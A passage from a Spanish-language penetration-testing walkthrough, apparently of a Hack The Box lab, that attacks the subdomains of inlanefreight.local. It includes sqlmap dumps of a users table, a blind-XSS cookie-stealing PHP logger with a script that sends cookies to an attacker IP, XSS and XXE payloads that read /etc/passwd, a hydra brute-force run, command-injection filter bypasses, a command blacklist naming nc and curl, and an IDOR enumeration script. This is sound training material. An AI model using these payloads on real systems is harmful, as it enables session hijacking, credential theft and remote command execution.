```

Centrándonos en la base de datos `status`, encontramos que sólo tiene dos tablas:

```shell-session
afsh4ck@kali$ sqlmap -r sqli.txt --dbms=mysql -D status --tables

<SNIP>

---
[00:10:29] [INFO] testing MySQL
[00:10:29] [INFO] confirming MySQL
[00:10:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 8.0.0
[00:10:29] [INFO] fetching tables for database: 'status'
Database: status
[2 tables]
+---------+
| company |
| users   |
+---------+
```

Desde aquí, podríamos intentar volcar todos los datos de la base de datos `status` y registrar otro hallazgo `SQL Injection`.

```bash
sqlmap -r burp.req --batch -D status --dump-all 

[19:26:05] [INFO] fetching entries for table 'users' in database 'status'
Database: status
Table: users
[2 entries]
+----+-----------------------------------+----------+
| id | password                          | username |
+----+-----------------------------------+----------+
| 1  | 4528342e54d6f8f8cf15bf6e3c31bf1f6 | Admin    |
| 2  | 1fbea4df249ac4f4881a5da387eb297cf | Flag     |
+----+-----------------------------------+----------+
```

#### Explotación

[#pregunta-4](#pregunta-4 "mention")

***

### support.inlanefreight.local

A continuación, exploramos el sitio `http://support.inlanefreight.local` y vemos que se trata de un portal de soporte técnico.&#x20;

<figure><img src="/files/m2NqPRmeyoFTHotP3Gg4" alt=""><figcaption></figcaption></figure>

Los portales de tickets de soporte nos permiten interactuar con un usuario en vivo y, en ocasiones, pueden provocar un ataque del lado del cliente, donde podemos secuestrar la sesión de un usuario mediante una vulnerabilidad `Cross-Site Scripting (XSS)`. Al explorar la aplicación, encontramos la página `/ticket.php` donde podemos generar un ticket de soporte.&#x20;

<figure><img src="/files/JrnSgmEcFQN8rg0bv9JY" alt=""><figcaption></figcaption></figure>

Veamos si podemos activar algún tipo de interacción con el usuario. Completamos todos los datos del ticket e incluímos lo siguiente en el campo `Message`:

```javascript
 "><script src=http://10.10.14.15:9000/TESTING_THIS</script>
```

Cambiamos la IP por la nuestra y iniciamos un listener `Netcat` en el puerto 9000 (o el puerto que queramos). Hacemos clic en el botón `Send` y comprobamos si el receptor recibe una llamada para confirmar la vulnerabilidad.

```shell-session
afsh4ck@kali$ nc -lvnp 9000

listening on [any] 9000 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.101] 56202
GET /TESTING_THIS%3C/script HTTP/1.1
Host: 10.10.14.15:9000
Connection: keep-alive
User-Agent: HTBXSS/1.0
Accept: */*
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

Este es un ejemplo de un ataque [Blind Cross Site Scripting (XSS)](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/cross-site-scripting-xss.md) ya que nos nos muestra nada en el front, pero recibimos la petición por el back.

<figure><img src="/files/tKtF3l3UGcezV5qtDkxK" alt=""><figcaption></figcaption></figure>

Ahora necesitamos averiguar cómo podemos robar la cookie de un administrador para poder iniciar sesión y ver qué tipo de acceso podemos obtener. Podemos hacerlo creando los siguientes dos archivos:

{% code title="index.php" %}

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

{% endcode %}

{% code title="script.js" %}

```javascript
new Image().src='http://10.10.14.15:9200/index.php?c='+document.cookie
```

{% endcode %}

A continuación, iniciamos un servidor web PHP en nuestro host de atacante de la siguiente manera:

```bash
sudo php -S 0.0.0.0:9200
```

Por último, creamos un nuevo ticket y enviamos lo siguiente en el campo de mensaje:

```javascript
"><script src=http://10.10.14.15:9200/script.js></script>
```

Recibimos una devolución de llamada en nuestro servidor web con una cookie de sesión de administrador:

<figure><img src="/files/ru7HAAQWuhYEQRyp59dd" alt=""><figcaption></figcaption></figure>

```bash
afsh4ck@kali$ sudo php -S 0.0.0.0:9200

<SNIP>

[Tue Jun 21 00:33:43 2022] 10.129.203.101:40104 [500]: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99

<SNIP>
```

A continuación, podemos utilizar un plugin de Firefox como [Cookie-Editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/?utm_source=addons.mozilla.org\&utm_medium=referral\&utm_content=search) para iniciar sesión utilizando la cookie de sesión del administrador.

<figure><img src="/files/RflSYiPGwpjsv7E5kU5y" alt=""><figcaption></figcaption></figure>

Hacemos clic en el botón Guardar para guardar la cookie nombrada `session` y hacemos clic en `Login` en la esquina superior derecha. Si todo funciona correctamente, seremos redirigidos a `http://support.inlanefreight.local/dashboard.php`.&#x20;

<figure><img src="/files/haCPaunFYDmcJMcmcSP8" alt=""><figcaption></figcaption></figure>

Tómate un tiempo para registrar otro hallazgo `Cross-Site Scripting (XSS)` teniendo en cuenta que este hallazgo es de alto riesgo, ya que puede usarse para robar la sesión de un administrador activo y acceder al sistema de cola de tickets.

Puedes consultar el módulo [Cross-Site Scripting (XSS)](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/cross-site-scripting-xss.md) para repasar información sobre XSS y las diversas maneras en que se puede aprovechar este tipo de vulnerabilidades, incluido el secuestro de sesiones.

#### Explotación

[#pregunta-5](#pregunta-5 "mention")

***

### tracking.inlanefreight.local

El sitio `http://tracking.inlanefreight.local/` nos permite ingresar un número de seguimiento y recibir un PDF con el estado de nuestro pedido.&#x20;

<figure><img src="/files/Hl1p65gDpW7vYyVkItGr" alt=""><figcaption></figcaption></figure>

La aplicación toma la información del usuario y genera un documento PDF. Al generar el PDF, podemos ver que el campo `Tracking #:` acepta cualquier información (no solo números) que especifiquemos en el cuadro de búsqueda antes de hacer clic en el botón `Track Now`. Si insertamos un payload JavaScript simple como `<script>document.write('TESTING THIS')</script>` y hacemos click en `Track Now`, vemos que se genera el PDF y se muestra el mensaje `TESTING THIS`, lo que parece indicar que el código JavaScript se ejecuta cuando el servidor web genera el documento.

![texto](https://academy.hackthebox.com/storage/modules/163/tracking_rendered.png)

Observamos que también podemos inyectar HTML. Un payload simple como `<h1>test</h1>`"] se renderizará en el campo `Tracking #:` al generar el PDF. Googlear algo como `pdf HTML injection vulnerability` arroja varios resultados interesantes, como [esta publicación](https://blog.appsecco.com/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2-214cc5ec5d90) y [esta otra](https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f) que analizan el uso de la inyección HTML, XSS y SSRF para la lectura local de archivos.

#### Explotación

[#pregunta-6](#pregunta-6 "mention")

***

#### Lidiando con lo inesperado

Aquí es donde la mentalidad de un pentester es clave. Debemos ser capaces de adaptarnos, investigar y explorar, y tomar la información que encontremos y aplicar nuestro proceso de pensamiento para determinar qué está sucediendo. Tras un breve sondeo, pudimos deducir que la aplicación web genera informes en PDF y que podemos controlar la entrada del input que, al parecer, solo debería aceptar números. Mediante una breve investigación, pudimos identificar una clase de vulnerabilidad con la que quizá aún no estemos familiarizados, pero sobre la que existe una considerable cantidad de investigación y documentación.&#x20;

Muchos investigadores publican estudios extremadamente detallados a partir de sus propias evaluaciones o Bug Bountys, y a menudo podemos usar esto como guía para intentar encontrar problemas similares. No hay dos evaluaciones iguales, pero el número de posibles stacks tecnológicos para aplicaciones web es limitado, por lo que es probable que veamos ciertas cosas una y otra vez, y pronto lo nuevo y difícil se convertirá en algo natural.

Analicemos algunos de estos artículos para ver si podemos obtener un resultado similar y obtener la lectura local de archivos. Después de esta [publicación](https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f) , probaremos la lectura local de archivos utilizando [objetos XMLHttpRequest (XHR)](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) y también consultando esta [excelente publicación](https://web.archive.org/web/20221207162417/https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/) sobre la lectura local de archivos mediante XSS en archivos PDF generados dinámicamente. Podemos usar este payload para probar la lectura de archivos, primero probando el archivo `/etc/passwd`, que es legible para todo el mundo y debería confirmar la existencia de la vulnerabilidad.

```javascript
	<script>
	x=new XMLHttpRequest;
	x.onload=function(){  
	document.write(this.responseText)};
	x.open("GET","file:///etc/passwd");
	x.send();
	</script>
```

Pegamos el payload en el cuadro de búsqueda y presionamos el botón `Track Now` y el PDF recién generado nos muestra el contenido del archivo, ¡así que hemos leído el archivo local!

![texto](https://academy.hackthebox.com/storage/modules/163/ssrf_file_read.png)

Si tras investigar no logramos descubrir la vulnerabilidad, deberíamos tomar notas detalladas de lo que hemos intentado y nuestro proceso de análisis, y pedir ayuda a nuestros compañeros y miembros más experimentados del equipo. Los equipos de pruebas de penetración suelen contar con personal especializado o con mayor experiencia en ciertas áreas, por lo que es probable que alguien del equipo haya visto esto o algo similar.

Experimenta con esta vulnerabilidad un poco más y descubre a qué más puedes acceder. Por ahora, anotaremos otro hallazgo de alto riesgo `SSRF to Local File Read` y seguiremos adelante.

***

### vpn.inlanefreight.local

<figure><img src="/files/o84wYWVVRynixCcR5ryZ" alt=""><figcaption></figcaption></figure>

Es común encontrar portales de VPN y otros portales de acceso remoto durante pruebas de penetración. Este parece ser un portal de inicio de sesión de VPN SSL de Fortinet. Durante las pruebas, confirmamos que la versión utilizada no era vulnerable a ningún exploit conocido. Podría ser un excelente candidato para Password Spraying en una prueba real, siempre que adoptemos un enfoque cuidadoso y controlado para evitar el bloqueo de cuentas.

Probamos algunos pares de credenciales comunes/débiles, pero recibimos el siguiente mensaje de error: `Access denied`, por lo que podemos pasar de aquí a la siguiente aplicación.

***

### gitlab.inlanefreight.local

<figure><img src="/files/rlkLNnkEy94qBDu7HCbt" alt=""><figcaption></figcaption></figure>

Muchas empresas alojan sus propias instancias de GitLab y, a veces, no las bloquean correctamente. Como se explica en la sección [GitLab - Descubrimiento y Enumeración](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/ataques-a-aplicaciones-web/ataques-a-aplicaciones-varias/gitlab-enumeracion.md), un administrador puede implementar varios pasos para limitar el acceso a una instancia de GitLab, como:

* Requerir la aprobación del administrador para nuevos registros
* Listas configuradas de dominios permitidos para registros
* Configurar una lista de denegación

Ocasionalmente, nos encontraremos con una instancia de GitLab que no esté adecuadamente protegida. Si logramos acceder a una instancia de GitLab, vale la pena investigar para ver qué tipo de datos podemos encontrar. Podríamos descubrir archivos de configuración que contengan contraseñas, claves SSH u otra información que nos permita acceder aún más. Vamos a registrarnos:

<figure><img src="/files/L3AeeBnul5N8PzKVveZo" alt=""><figcaption></figcaption></figure>

Después de registrarnos, podemos navegar a `/explore` para ver a qué proyectos, si los hay, tenemos acceso. Vemos que podemos acceder al proyecto `shopdev2.inlanefreight.local`, lo que nos da una pista sobre otro subdominio que no descubrimos mediante la transferencia de zona DNS y que probablemente no pudimos encontrar mediante fuerza bruta de subdominios.

<figure><img src="/files/B0WsQVTVUrvcRbr11Lxj" alt=""><figcaption></figcaption></figure>

Antes de explorar el nuevo subdominio, podemos registrar otro hallazgo de alto riesgo: `Misconfigured GitLab Instance`. También tendríamos que añadir el subdominio descubierto a la tabla `Subdomain Discovery` de nuestro informe, en el Appendix

#### Explotación

[#pregunta-7](#pregunta-7 "mention")

***

### shopdev2.inlanefreight.local

Nuestra enumeración de la instancia de GitLab nos llevó a otro vhost, así que primero lo añadiremos a nuestro archivo `/etc/hosts` para poder acceder a él.&#x20;

Al navegar a `http://shopdev2.inlanefreight.local`, se nos redirige a una página de inicio de sesión `/login.php`.&#x20;

<figure><img src="/files/zHvMSSYeyUWPuOIHPxu6" alt=""><figcaption></figcaption></figure>

Las omisiones de autenticación típicas no nos llevan a ninguna parte, así que volvemos a lo básico según la sección "[Descubrimiento y Enumeración de Aplicaciones](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/ataques-a-aplicaciones-web/descubrimiento-y-enumeracion-de-aplicaciones.md)" y probamos algunos pares de credenciales débiles. A veces, lo más sencillo funciona (y sí, vemos este tipo de cosas en producción, tanto internas como externas) y podemos iniciar sesión con `admin:admin`. Una vez iniciada la sesión, vemos una especie de tienda online para comprar productos al por mayor.&#x20;

<figure><img src="/files/yUkqfoFWf7r20iIexVFV" alt=""><figcaption></figcaption></figure>

Cuando vemos `dev` en una URL (sobre todo externa), podemos asumir que no está lista para producción y que vale la pena investigarla, sobre todo por el comentario `Checkout Process not Implemented` al final de la página.

Podemos probar la búsqueda de vulnerabilidades de inyección y buscar [IDOR](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/ataques-web-modernos/idor.md) y otras fallas, pero no encontramos nada particularmente interesante. Probemos el flujo de compra, centrándonos en el proceso de pago del carrito y capturando las solicitudes en Burp Suite. Añadimos uno o dos artículos al carrito, buscamos `/cart.php` y hacemos clic en el botón `I AGREE` para analizar la solicitud en Burp. En Burp, vemos que se realiza una solicitud `POST XML` en el cuerpo, como se muestra a continuación:

<figure><img src="/files/o6Qk44dXYKlYbhkHSKnp" alt=""><figcaption></figcaption></figure>

```xml
<?xml version="1.0" encoding="UTF-8"?>
    <root>
     <subtotal>
      undefined
     </subtotal>
     <userid>
      1206
     </userid>
    </root>
```

Recordemos el contenido del módulo  [Ataques Web - XXE](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/ataques-web-modernos/xml-external-entity-xxe.md); parece ser una buena opción, ya que el formulario parece enviar datos al servidor en formato XML. Probamos varios payloads y finalmente logramos la lectura local del archivo `/etc/passwd` para ver su contenido con este payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
  <!ENTITY xxetest SYSTEM "file:///etc/passwd">
]>
<root>
	<subtotal>
		undefined
	</subtotal>
	<userid>
		&xxetest;
	</userid>
</root>
```

<figure><img src="/files/5WoAvEyKO3PgOKmITd0j" alt=""><figcaption></figcaption></figure>

Anotemos otro hallazgo de riesgo alto: `XML External Entity (XXE) Injection`(¡tenemos una lista bastante larga hasta ahora!) y pasemos al último vhost/subdominio.

#### Explotación

[#pregunta-8](#pregunta-8 "mention")

***

### monitoring.inlanefreight.local

Descubrimos el vhost  [`monitoring`](/ethical-hacking-cheatsheet/hacking-en-entornos-reales/enterprise-hacking/pruebas-externas/recopilacion-de-informacion-externa.md) antes, así que no repetiremos el proceso. Usamos ffuf, pero esta enumeración también se puede realizar con otras herramientas. Navegar a `http://monitoring.inlanefreight.local` resulta en una redirección a `/login.php`.&#x20;

<figure><img src="/files/DB9WoKhlHyGfOQu68LQo" alt=""><figcaption></figcaption></figure>

Podemos probar algunos payloads para omitir la autenticación y pares de credenciales débiles comunes, pero no obtenemos resultados; solo recibimos el error `Invalid Credentials!` constantemente. Dado que se trata de un formulario de inicio de sesión, vale la pena explorarlo más a fondo para poder fuzzearlo un poco con Burp Intruder y ver si podemos generar un mensaje de error que indique una vulnerabilidad de inyección SQL, pero no lo logramos.

Un análisis de la solicitud y respuesta POST en Burp Suite no arroja resultados interesantes. En este punto, hemos agotado casi todos los posibles ataques web y volvemos al contenido del módulo, recordando el módulo [Hydra](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/hydra.md) . Esta herramienta puede usarse para forzar formularios de inicio de sesión HTTP, así que vamos a probarla. Usaremos la misma [lista de palabras](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top100.txt) de `SecLists` que antes.

Configuraremos `hydra` para el ataque de fuerza bruta, especificando el mensaje de error `Invalid Credentials!` para filtrar los intentos de inicio de sesión no válidos. Obtenemos una coincidencia para el par de credenciales `admin:12qwaszx`, una contraseña común de "recorrido por teclado" fácil de recordar, pero muy fácil de descifrar mediante fuerza bruta.

Podríamos registrar un hallazgo `Weak Admin Credentials` y continuar.

```shell-session
afsh4ck@kali$ hydra -l admin -P ./passwords.txt monitoring.inlanefreight.local http-post-form "/login.php:username=admin&password=^PASS^:Invalid Credentials!"

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-21 11:32:17
[DATA] max 16 tasks per 1 server, overall 16 tasks, 99 login tries (l:1/p:99), ~7 tries per task
[DATA] attacking http-post-form://monitoring.inlanefreight.local:80/login.php:username=admin&password=^PASS^:Invalid Credentials!
[80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-21 11:32:22
```

Una vez iniciada la sesión, se nos presenta una especie de consola de monitorización. Si escribimos `help`, se nos presenta una lista de comandos. Esto parece un entorno de shell restringido para realizar tareas limitadas y algo muy peligroso que no debería exponerse externamente. Podríamos echarle un vistazo a la sección [Command Inyection](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/command-injection.md) para saber como explotar esta vulnerabilidad.

<figure><img src="/files/5abZG34IFs67FgqyarzS" alt=""><figcaption></figcaption></figure>

Revisamos cada comando. Intentar `cat /etc/passwd` no funciona, así que parece que estamos en un entorno restringido. `whoami` nos proporciona información básica. No queremos `reiniciar` el objetivo ni causar una interrupción del servicio. No podemos acceder con `cd` a otros directorios. Al escribir, `ls` se muestran algunos archivos que probablemente estén almacenados en el directorio al que estamos restringidos.

<figure><img src="/files/qJZfatBxDK4sVFrldAV2" alt=""><figcaption></figcaption></figure>

Al revisar los archivos, encontramos un servicio de autenticación y que estamos dentro de un contenedor. La última opción de la lista es `connection_test`. Al escribirla, se obtiene un mensaje `Success` y nada más. Al regresar a Burp Suite y usar el proxy para la solicitud, vemos que se realiza una solicitud `GET` a `/ping.php` para la IP del host local `127.0.0.1` y la respuesta HTTP muestra un único ataque de ping exitoso.&#x20;

<figure><img src="/files/a13QQVhDsgGobW07lU2F" alt=""><figcaption></figcaption></figure>

Podemos intuir que el script `/ping.php` está ejecutando un comando operativo mediante una función PHP como , `shell_exec(ping -c 1 127.0.0.1)`o similar, utilizando la función [system()](https://www.php.net/manual/en/function.system.php) para ejecutar un comando. Si este script está mal codificado, podría fácilmente resultar en una vulnerabilidad de Command Injection, así que probemos algunos payloads comunes.

Parece haber algún tipo de filtro implementado, ya que al intentar payloads estándar como `GET /ping.php?ip=%127.0.0.1;id` y `GET /ping.php?ip=%127.0.0.1|id` se produce un error `Invalid input`, lo que significa que probablemente haya una lista negra de caracteres en juego. Podemos bypassear este filtro usando un carácter de salto de línea `%0A`(o nueva línea) como operador de inyección, siguiendo la metodología descrita en la sección " [Bypass de filtros de espacios](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/command-injection/bypass-de-filtros-de-espacios.md)".&#x20;

<figure><img src="/files/gtxHKPCe6qj2K0d7lUZq" alt=""><figcaption></figcaption></figure>

Podemos realizar una solicitud añadiendo el carácter de nueva línea como se indica a continuación `GET /ping.php?ip=127.0.0.1%0a`, y el ping sigue siendo exitoso, lo que significa que el carácter no está en la lista negra.

Hemos ganado la primera batalla, pero parece que hay otro tipo de filtro activado, ya que intentar algo como `GET /ping.php?ip=127.0.0.1%0aid` sigue generando un error `Invalid input`. A continuación, podemos experimentar con la sintaxis del comando y ver que podemos omitir el segundo filtro usando comillas simples. Cambiando a `cURL`, podemos ejecutar el comando `id` de la siguiente manera:

```shell-session
afsh4ck@kali$ curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'd"

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.045 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.045/0.045/0.045/0.000 ms
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
```

Hemos logrado ejecutar el comando como el usuario `webdev`. Investigando un poco más, observamos que este host tiene varias direcciones IP, una de las cuales lo ubica dentro de la red `172.16.8.0/23` que formaba parte del alcance inicial. Si logramos un acceso estable a este host, podríamos acceder a la red interna y comenzar a atacar el dominio de Active Directory.

```shell-session
afsh4ck@kali$ curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'fconfig"

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.048 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.048/0.048/0.048/0.000 ms

<SNIP>

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.203.101  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb9:67a5  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:67a5  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:67:a5  txqueuelen 1000  (Ethernet)
        RX packets 10055  bytes 1041358 (1.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2316  bytes 4030180 (4.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.8.120  netmask 255.255.254.0  broadcast 172.16.255.255
        inet6 fe80::250:56ff:feb9:a62d  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:a6:2d  txqueuelen 1000  (Ethernet)
        RX packets 21515  bytes 1890242 (1.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 15  bytes 1146 (1.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Nuestro próximo reto es encontrar una forma de acceder a una reverse shell. Podemos ejecutar comandos individuales, pero cualquier comando con un espacio no funciona. Volviendo a la sección "[Bypass de filtros de espacios](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/command-injection/bypass-de-filtros-de-espacios.md)" del módulo [`Command Injection`](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/command-injection.md), recordamos que podemos usar un `Linux Environment Variable` `($IFS)` para omitir las restricciones de espacio. Podemos combinar esto con la omisión del carácter de nueva línea y empezar a enumerar maneras de obtener una reverse shell. Para facilitarnos la tarea, revisemos el archivo `ping.php` para comprender qué se está filtrando y así evitar las conjeturas.

Si regresamos a Burp y realizamos la solicitud `GET /ping.php?ip=127.0.0.1%0a'c'at${IFS}ping.php`, o algo similar, obtenemos el contenido del archivo `ping.php` y podemos trabajar para bypassear el filtro y encontrar una forma de establecer un reverse shell.

```php
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$output = '';

function filter($str)
{
  $operators = ['&', '|', ';', '\\', '/', ' '];
  foreach ($operators as $operator) {
    if (strpos($str, $operator)) {
      return true;
    }
  }
  $words = ['whoami', 'echo', 'rm', 'mv', 'cp', 'id', 'curl', 'wget', 'cd', 'sudo', 'mkdir', 'man', 'history', 'ln', 'grep', 'pwd', 'file', 'find', 'kill', 'ps', 'uname', 'hostname', 'date', 'uptime', 'lsof', 'ifconfig', 'ipconfig', 'ip', 'tail', 'netstat', 'tar', 'apt', 'ssh', 'scp', 'less', 'more', 'awk', 'head', 'sed', 'nc', 'netcat'];
  foreach ($words as $word) {
    if (strpos($str, $word) !== false) {
      return true;
    }
  }

  return false;
}

if (isset($_GET['ip'])) {
  $ip = $_GET['ip'];
  if (filter($ip)) {
    $output = "Invalid input";
  } else {
    $cmd = "bash -c 'ping -c 1 " . $ip . "'";
    $output = shell_exec($cmd);
  }
}
?>
<?php
echo $output;
?>
```

Podemos ver que la mayoría de las opciones para obtener una reverse shell están filtradas, lo que dificulta las cosas; sin embargo, una que no lo está es `socat`. Socat es una herramienta versátil que permite capturar shells e incluso pivotar, como vimos en el módulo [Pivoting, Tunnelling y Port Forwarding](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/pivoting-tunelling-y-port-forwarding/pivoting-con-socat.md) . Comprobemos si está disponible en el sistema. Al regresar a Burp y usar la solicitud, `GET /ping.php?ip=127.0.0.1%0a'w'h'i'ch${IFS}socat` vemos que está disponible en el sistema, en  `/usr/bin/socat`.

<figure><img src="/files/igcvpoYbhE5dUWODF2NK" alt=""><figcaption></figcaption></figure>

#### Explotación

[#pregunta-9](#pregunta-9 "mention")

***

### Próximos pasos

Ahora que finalmente hemos completado todos los servicios y aplicaciones web externos, tenemos una idea clara de los próximos pasos. En la siguiente sección, trabajaremos en establecer un shell inverso en el entorno interno y escalaremos nuestros privilegios para establecer algún tipo de persistencia en el host de destino.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.229.147
```

### Pregunta 1

> Usa la vulnerabilidad IDOR para encontrar una flag. Envía el valor de la flag como respuesta

#### carrers.inlanefreight.local

Vamos a crear un usuario en la página de registro. Registramos una cuenta con detalles falsos: `test@test.com` y las credenciales `pentester:Str0ngP@ssw0rd!`.&#x20;

<figure><img src="/files/fHkVf1eFg4Zs3uflZgXi" alt=""><figcaption></figcaption></figure>

Una vez que accedemos tenemos un listado de vacantes y un visor de posibles trabajos:

<figure><img src="/files/JaXO64hcqi9jL7BIHriB" alt=""><figcaption></figcaption></figure>

Lo primero que notamos es que tenemos un parámetro id=9 que podríamos fuzzear:

```http
http://careers.inlanefreight.local/profile?id=9
```

Al capturar la petición con BurpSuite y cambiar el id a 8 por ejemplo vemos que nos da status 200, con lo que podríamos acceder a datos de otros usuarios:

<figure><img src="/files/mJ1ADvcdOwkiyFiXAGIV" alt=""><figcaption></figcaption></figure>

#### Enumerar usuarios

Como en el front observamos que se pinta `Jobs applied by pentester` donde "pentester" es el nombre de usuario podemos usar el siguiente script para enumerar usuarios:

```python
import requests
import re

# Endpoint vulnerable
url = "http://careers.inlanefreight.local/profile"

# Cabeceras necesarias
headers = {
    "Host": "careers.inlanefreight.local",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "DNT": "1",
    "Connection": "keep-alive",
    "Cookie": "session=eyJsb2dnZWRfaW4iOnRydWV9.Z_QckQ.VmsAass10VUCT-fsy4P1koY8jLs",
    "Upgrade-Insecure-Requests": "1"
}

# Rango de IDs a probar
start_id = 1
end_id = 50

found_users = set()

print(f"[+] Buscando usuarios en perfiles del {start_id} al {end_id}...\n")

for user_id in range(start_id, end_id + 1):
    params = {"id": str(user_id)}
    response = requests.get(url, headers=headers, params=params)

    if response.status_code == 200:
        match = re.search(r'Jobs applied by (\w+)', response.text)
        if match:
            username = match.group(1)
            if username not in found_users:
                found_users.add(username)
                print(f"[+] ID {user_id} => Usuario encontrado: {username}")

if not found_users:
    print("[-] No se encontraron usuarios.")
else:
    print("\n✅ Enumeración completada. Usuarios encontrados:")
    for user in found_users:
        print(f" - {user}")

```

Al ejecutarlo nos devuelve todos  los nombres de usuarios:

```bash
python3 idor_test_id.py

[+] Buscando usuarios en perfiles del 1 al 50...

[+] ID 1 => Usuario encontrado: James
[+] ID 2 => Usuario encontrado: Harry
[+] ID 3 => Usuario encontrado: Tom
[+] ID 4 => Usuario encontrado: htb
[+] ID 5 => Usuario encontrado: Jerry
[+] ID 7 => Usuario encontrado: John
[+] ID 8 => Usuario encontrado: Miller
[+] ID 9 => Usuario encontrado: pentester

✅ Enumeración completada. Usuarios encontrados:
 - htb
 - John
 - Tom
 - Miller
 - Jerry
 - Harry
 - pentester
 - James
```

Tenemos los ID´s del 1 al 9, así que ya es cuestión de ir probando los ID´s hasta obtener la flag:

<figure><img src="/files/pM2MoWStTeyrYIF3bpnC" alt=""><figcaption></figcaption></figure>

### Pregunta 2

> Aprovecha la vulnerabilidad de HTTP Verb Tampering para encontrar una flag. Envía el valor de la flag como respuesta

#### dev.inlanefreight.local

Al acceder solo tenemos un panel de login. Probamos credenciales por defecto pero no conseguimos acceso.

<figure><img src="/files/d7CqOzentKfTCQGgrQVE" alt=""><figcaption></figcaption></figure>

#### Fuzzing

Al hacer fuzzing simplemente encontramos la flag en un archivo flag.txt

```
feroxbuster -u  http://dev.inlanefreight.local/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
                                                                                                                                                                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev.inlanefreight.local/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      288c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      285c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
